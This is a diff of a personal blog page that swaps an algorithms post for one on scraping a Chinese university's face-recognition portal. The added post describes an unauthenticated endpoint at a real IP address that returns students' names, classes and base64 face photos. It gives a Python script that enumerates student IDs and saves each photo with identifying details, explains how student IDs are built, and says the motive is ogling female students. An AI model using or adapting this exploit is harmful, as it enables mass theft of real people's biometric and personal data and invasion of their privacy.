@@ -8,7 +8,7 @@
 <meta name="keywords" content="java">
 <meta name="description" content="温故而知新">
 <meta name="theme-color" content="#000">
-<title>手撕中缀表达式转后缀表达式（逆波兰式） | 煨酒小童</title>
+<title>湖北师范大学人脸爬取 | 煨酒小童</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1615531280838">
 <link rel="stylesheet" href="/styles/main.css">
 <link rel="stylesheet" href="/media/css/gemini.css">
@@ -29,8 +29,8 @@
 
 
 
-  <meta name="description" content="手撕中缀表达式转后缀表达式（逆波兰式）" />
-  <meta name="keywords" content="算法,java" />
+  <meta name="description" content="湖北师范大学人脸爬取" />
+  <meta name="keywords" content="" />
 </head>
 
 <body>
@@ -164,7 +164,8 @@
       <div class="sidebar-body gemini" id="sidebar_body">
         
           
-            
+            <div class="post-side-meta" id="post_side_meta">
+              
 <div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
@@ -235,6 +236,199 @@
 
 
 </div>
+            </div>
+            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
+              <div class="toc-box right-motion">
+  <div class="toc-wrapper auto-number auto"
+    id="toc_wrapper">
+    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E6%94%B6%E8%8E%B7">收获</a>
+<ul>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script>
+
+  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
+  let active = 'active-show', activeClass = 'active-current';
+  let tocWrapper = document.querySelector('#toc_wrapper');
+  let tocContent = tocWrapper.children[0];
+  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
+
+  function addTocNumber(elem, deep) {
+    if (!elem) {
+      return;
+    }
+    let prop = elem.__proto__;
+
+    if (prop === HTMLUListElement.prototype) {
+      for (let i = 0; i < elem.children.length; i++) {
+        addTocNumber(elem.children[i], deep + (i + 1) + '.');
+      }
+    } else if (prop === HTMLLIElement.prototype) {
+      // 保存li元素
+      if (elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
+        lList.push(elem);
+      }
+      for (let i = 0; i < elem.children.length; i++) {
+        let cur = elem.children[i];
+        if (cur.__proto__ === HTMLAnchorElement.prototype) {
+          if (autoNumber) {
+            cur.text = deep + ' ' + cur.text;
+          }
+        } else if (cur.__proto__ === HTMLUListElement.prototype) {
+          addTocNumber(cur, deep);
+        }
+      }
+    }
+  }
+
+  function removeParentActiveClass() {
+    let parents = tocContent.querySelectorAll('.' + active)
+    parents.forEach(function (elem) {
+      elem.classList.remove(active);
+    });
+  }
+
+  function addActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.add(activeClass);
+    }
+  }
+
+  function removeActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.remove(activeClass);
+    }
+  }
+
+  function addActiveLiElemment(elem, parent) {
+    if (!elem || elem === parent) {
+      return;
+    } else {
+      if (elem.__proto__ === HTMLLIElement.prototype) {
+        elem.classList.add(active);
+      }
+      addActiveLiElemment(elem.parentElement, parent);
+    }
+  }
+
+  function showToc() {
+    if (tocWrapper) {
+      postBody = document.querySelector('#post_body');
+      for (let i = 0; i < postBody.children.length; i++) {
+        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
+          hList.push(postBody.children[i]);
+        }
+      }
+      if (tocWrapper.classList.contains('compress')) {
+        tocContent.classList.add('closed');
+      } else if (tocWrapper.classList.contains('no_compress')) {
+        tocContent.classList.add('expanded');
+      } else {
+        if (hList.length > 10) {
+          active = 'active-hidden'
+          tocContent.classList.add('closed');
+        } else {
+          tocContent.classList.add('expanded');
+        }
+      }
+    }
+  }
+
+  (function () {
+    // 处理不是从#一级标题开始目录
+    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
+      let con = tocContent.children[0].children[0];
+      tocContent.innerHTML = con.innerHTML;
+    }
+    let markdownItTOC = document.querySelector('.markdownIt-TOC');
+    let innerHeight = window.innerHeight;
+    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
+    addTocNumber(tocContent, '');
+  })();
+
+  document.addEventListener('scroll', function (e) {
+    if (lList.length <= 0) {
+      return;
+    }
+    let scrollTop = document.scrollingElement.scrollTop + 10;
+    let dir;
+
+    if (lastTop - scrollTop > 0) {
+      dir = 'up';
+    } else {
+      dir = 'down';
+    }
+
+    lastTop = scrollTop;
+    if (scrollTop <= 0) {
+      if (lastIndex >= 0 && lastIndex < hList.length) {
+        lList[lastIndex].classList.remove(activeClass);
+      }
+      return;
+    }
+
+    let current = 0, hasFind = false;
+    for (let i = 0; i < hList.length; i++) {
+      if (hList[i].offsetTop > scrollTop) {
+        current = i;
+        hasFind = true;
+        break;
+      }
+    }
+    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
+      current = hList.length - 1;
+    } else {
+      current--;
+    }
+    if (dir === 'down') {
+      if (current > lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex)
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    } else {
+      if (current < lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex);
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    }
+  });
+
+
+  window.addEventListener('load', function () {
+    showToc();
+    document.querySelector('#sidebar').style = 'display: block;';
+    tocWrapper.classList.add('toc-active');
+    setTimeout(function () {
+      if ("createEvent" in document) {
+        let evt = document.createEvent("HTMLEvents");
+        evt.initEvent("scroll", false, true);
+        document.dispatchEvent(evt);
+      }
+      else {
+        document.fireEvent("scroll");
+      }
+    }, 500)
+  })
+
+</script>
+            </div>
           
         
       </div>
@@ -322,8 +516,8 @@
           <div class="section bg-color post post-page">
             <header class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://lililib.github.io/post/hou-zhui-biao-da-shi-ni-bo-lan-shi/">
-      手撕中缀表达式转后缀表达式（逆波兰式）
+    <a class="post-title-link" href="https://lililib.github.io/post/hu-bei-shi-fan-da-xue-ren-lian-pa-qu/">
+      湖北师范大学人脸爬取
     </a>
   </h1>
   <div class="post-meta">
@@ -331,42 +525,23 @@
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span>发布于</span>
-      <span>2020-12-26</span>
+      <span>2021-03-12</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
     <span class="meta-item">
-      <i class="fa fa-folder-o"></i>
-      <span class="pc-show">分类于</span>
-      
-      
-      <a href="https://lililib.github.io/tag/hae_F4xlz/">
-        <span>算法</span>
-      </a>、
-      
-      
-      
-      <a href="https://lililib.github.io/tag/CdKsg5n2m/">
-        <span>java</span>
-      </a>
-      
-      
-    </span>
-    <span class="post-meta-divider">|</span>
-    
-    <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>1分钟</span>
+      <span>4分钟</span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>183<span class="pc-show">字数</span></span>
+      <span>856<span class="pc-show">字数</span></span>
     </span>
     
     
     
-    <span id="/post/hou-zhui-biao-da-shi-ni-bo-lan-shi/" data-flag-title="手撕中缀表达式转后缀表达式（逆波兰式）" class="meta-item pc-show leancloud_visitors">
+    <span id="/post/hu-bei-shi-fan-da-xue-ren-lian-pa-qu/" data-flag-title="湖北师范大学人脸爬取" class="meta-item pc-show leancloud_visitors">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-eye"></i>
       <span>浏览量：<span class="leancloud-visitors-count"></span></span>
@@ -375,19 +550,125 @@
   </div>
 </header>
             <div class="post-body next-md-body" id="post_body">
-              <p>中缀表达式转后缀表达式转化后只是<strong>操作符的次序变了，操作数的次序并没有变</strong></p>
-<p>唯一知道一点<strong>a+b转后缀表达式为ab+,乘法除法都雷同</strong>就可了其他运算次序为从左到右依次运算，先运算的还是先运算（操作符优先程度高的，如乘法优先加法之类的）</p>
-<!-- more -->
-<p>中缀表达式：a + b*c + (d * e + f) * g转换成后缀表达式则为a b c * + d e * f  + g * +</p>
+              <p>疫情期间宿舍安装了人脸识别门禁，要求登录一个网站上传人脸照片。对于有价值的信息我有很好的嗅觉（素颜女生嘿嘿(●ˇ∀ˇ●)），感觉可以查探查探.......</p>
+<p>F12刷新审查网络请求，逐个点击查看发现了一个请求有学号构成的接口，这个接口有明显的个人信息imgstr应该就是个人上传的照片了</p>
+<p><img src="https://lililib.github.io//post-images/1615528372126.jpg" alt="" loading="lazy"><br>
+<img src="https://lililib.github.io//post-images/1615528065782.jpg" alt="" loading="lazy"></p>
+<p>复制接口进入地址栏很幸运的发现这个接口并没有登陆限制，再随便改一个学号数字，发现可以请求到其他人的信息，一顿操作猛如虎，目标就是他了</p>
+<figure data-type="image" tabindex="1"><img src="https://lililib.github.io//post-images/1615528440520.png" alt="" loading="lazy"></figure>
+<p>这个一大串imgstr信息搞不明白什么格式，问了隔壁大哥说是base64编码，遂复制信息在线解码为照片，发现解码失败，又自己印证了一些图片经过base64编码后的格式，遂确定这确实为base64编码，只是被加密了。大哥说加密方法都在js文件中，遂进入源代码查看js代码。美化格式，搜索base64关键字，发现了一个极为相关的函数，复制函数名再次搜索，很明显replace这个方法是把imgstr内的'\r\n'代替为''</p>
+<p><img src="https://lililib.github.io//post-images/1615529171600.png" alt="js文件" loading="lazy"><br>
+<img src="https://lililib.github.io//post-images/1615529194707.png" alt="" loading="lazy"><br>
+<img src="https://lililib.github.io//post-images/1615529207895.png" alt="解密代码" loading="lazy"></p>
+<p>再去接口网页那里搜索’\r\n‘,解密方法明显就是去掉’\r\n‘了，复制内容到文本文档替换‘\r\n’为空字符串，再重新复制到在线解码网站，图片被成功还原了！</p>
+<figure data-type="image" tabindex="2"><img src="https://lililib.github.io//post-images/1615529706828.png" alt="加密信息" loading="lazy"></figure>
+<p>解密完成剩下的就是爬取图片了。大致步骤就是请求图片，解密信息，保存信息<br>
+python代码：</p>
+<pre><code>import requests
+import json
+import base64
+
+
+# 返回网页
+def getImgStr(url, headers):
+    try:
+        r = requests.get(url, headers=headers, timeout=30)
+        r.raise_for_status()
+        r.encoding = r.apparent_encoding
+        body = r.text
+        response = json.loads(body)
+        code=response[&quot;code&quot;]
+        userName=response[&quot;data&quot;][&quot;userName&quot;]
+        userNo=response[&quot;data&quot;][&quot;userNo&quot;]
+        instituteName=response[&quot;data&quot;][&quot;instituteName&quot;]
+        majorName=response[&quot;data&quot;][&quot;majorName&quot;]
+        className=response[&quot;data&quot;][&quot;className&quot;]
+        return response[&quot;data&quot;][&quot;imgStr&quot;],code,instituteName,majorName,userName,userNo,className
+    except:
+        print(url+&quot;未有学号&quot;)
+
+headers = {
+    'User-Agent':
+        'Mozilla / 5.0(WindowsNT10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 81.0.4044.138Safari / 537.36',
+}
+url = 'http://218.197.16.168:5027/face/getUserInfo?userNo='
+
+
+#num=2018107010101 美院
+num=2018115010101
+for i in range(0,1):  #班级（倒数第三个数）
+    for j in range(0,30):    #班级人数（倒数两个数）
+        tempurl=url+str(num+i*100+j)    
+        print(tempurl)
+        aaa = getImgStr(tempurl, headers)       #获取的json数据
+        try:
+            imgStr=aaa[0]   #地址
+            code=aaa[1]        #信息码（600 is ok）
+            if(code!=600):
+                continue
+            userName=aaa[4]     
+            userNo=aaa[5]          #学号
+            instituteName=aaa[2]    #院系
+            majorName=aaa[3]    #专业
+            className=aaa[6]    #班级  
+            try:
+                imgStr =imgStr.replace('\\r\\n', '')        #解密
+            except:
+                print('未上传信息')           
+            imgdata=base64.b64decode(imgStr)
+            imgName='{}-{}-{}-{}-{}.jpg'.format(userNo,userName,instituteName,majorName,className)
+            path='D:\download\学校照片\{}'.format(imgName)
+            with open(path, 'wb') as fo:
+                fo.write(imgdata)
+        except:
+            print(&quot; &quot;)
+
+</code></pre>
+<p>爬取结果<br>
+<img src="https://lililib.github.io//post-images/1615530414846.png" alt="" loading="lazy"></p>
+<h2 id="收获">收获</h2>
 <ol>
-<li>a + b*c + ( d * e + f ) * g</li>
-<li>a+( bc* )+( d * e + f ) * g</li>
-<li>( abc*+ )+( d * e + f ) * g    ----------x+y-&gt;xy+     这里把上面的x=a  ,y=bc*   所以转换后为abc*+</li>
-<li>( abc*+ )+( ( de* )+f ) *g</li>
-<li>( abc*+ )+( de*f+ )*g</li>
-<li>( abc*+ )+( de<em>f+g</em> )</li>
-<li>abc*+de<em>f+g</em>+</li>
+<li>学校学号构成记录一下：</li>
 </ol>
+<ul>
+<li>
+<p>2018115010201</p>
+</li>
+<li>
+<p>2018- 年份</p>
+</li>
+<li>
+<p>1- 校区</p>
+</li>
+<li>
+<p>15- 系代码          （最大19）</p>
+</li>
+<li>
+<p>01- 学院代码        （最大07）</p>
+</li>
+<li>
+<p>02- 班级              （  最大14）</p>
+</li>
+<li>
+<p>37- 班级人数          （ 最大66）</p>
+</li>
+</ul>
+<ol start="2">
+<li>pyhon的xlwt库存进excel保存大数据不行比如图片</li>
+</ol>
+<pre><code>import xlwt
+wb=xlwt.Workbook()
+sh1=wb.add_sheet('成绩')    #创建一个页面
+sh1.write(0, 0, 'userNo')   #第零行第零列写入
+sh1.write(0, 1, 'userName')
+wb.save('test.xls')
+</code></pre>
+<ol start="3">
+<li>索然无味，食堂路上遇到的美女也没有那么高不可攀了</li>
+</ol>
+<h3 id="总结">总结</h3>
+<pre><code>啊，原来我的高中同学还是那么漂亮，个版子滴！
+</code></pre>
 
             </div>
             <div class="post-footer">
@@ -398,7 +679,7 @@
     </li>
     <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="https://lililib.github.io/post/hou-zhui-biao-da-shi-ni-bo-lan-shi/" title="手撕中缀表达式转后缀表达式（逆波兰式）">https://lililib.github.io/post/hou-zhui-biao-da-shi-ni-bo-lan-shi/</a>
+      <a href="https://lililib.github.io/post/hu-bei-shi-fan-da-xue-ren-lian-pa-qu/" title="湖北师范大学人脸爬取">https://lililib.github.io/post/hu-bei-shi-fan-da-xue-ren-lian-pa-qu/</a>
     </li>
     <li class="post-copyright-license">
       <strong>版权声明： </strong>
@@ -407,23 +688,15 @@
   </ul>
   <div class="tags">
     
-      <a href="https://lililib.github.io/tag/hae_F4xlz/"># 算法</a>
-    
-      <a href="https://lililib.github.io/tag/CdKsg5n2m/"># java</a>
-    
   </div>
   <div class="nav">
     <div class="nav-prev">
       
-        <i class="fa fa-chevron-left"></i>
-        <a class="nav-pc-next" title="回溯，动态规划-求n个数中和为k的最少解" href="https://lililib.github.io/post/hui-su-dong-tai-gui-hua-qiu-n-ge-shu-zhong-he-wei-k-de-zui-shao-jie/">回溯，动态规划-求n个数中和为k的最少解</a class="nav-pc-next">
-        <a class="nav-mobile-prev" title="回溯，动态规划-求n个数中和为k的最少解" href="https://lililib.github.io/post/hui-su-dong-tai-gui-hua-qiu-n-ge-shu-zhong-he-wei-k-de-zui-shao-jie/">上一篇</a>
-      
     </div>
     <div class="nav-next">
       
-        <a class="nav-pc-next" title="n后问题" href="https://lililib.github.io/post/n-hou-wen-ti/">n后问题</a>
-        <a class="nav-mobile-next" title="n后问题" href="https://lililib.github.io/post/n-hou-wen-ti/">下一篇</a>
+        <a class="nav-pc-next" title="小问题集合" href="https://lililib.github.io/post/xiao-wen-ti-ji-he/">小问题集合</a>
+        <a class="nav-mobile-next" title="小问题集合" href="https://lililib.github.io/post/xiao-wen-ti-ji-he/">下一篇</a>
         <i class="fa fa-chevron-right"></i>
       
     </div>
